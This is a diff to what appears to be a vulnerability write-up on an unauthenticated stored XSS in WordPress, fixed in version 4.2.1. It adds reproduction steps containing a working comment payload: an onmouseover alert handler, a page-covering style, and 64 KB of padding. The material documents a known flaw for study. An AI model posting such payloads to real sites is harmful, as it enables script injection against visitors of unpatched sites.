@@ -6,5 +6,6 @@
 	- Fixed in version: 4.2.1
 	- Type of Vulnerability: XSS
 	- Sourcecode/walkthrough: https://klikki.fi/adv/wordpress2.html
-- GIF:
-		<img src="XSS - Unauthenticated Stored XSS.gif" width="800">
+- Steps to recreate:
+	- Create a comment on website with a string following the format: <a title='x onmouseover=alert(unescape(/hello%20world/.source)) style=position:absolute;left:0;top:0;width:5000px;height:5000px  AAAAAAAAAAAA...[64 kb]..AAA'></a>
+<img src="XSS - Unauthenticated Stored XSS.gif" width="800">
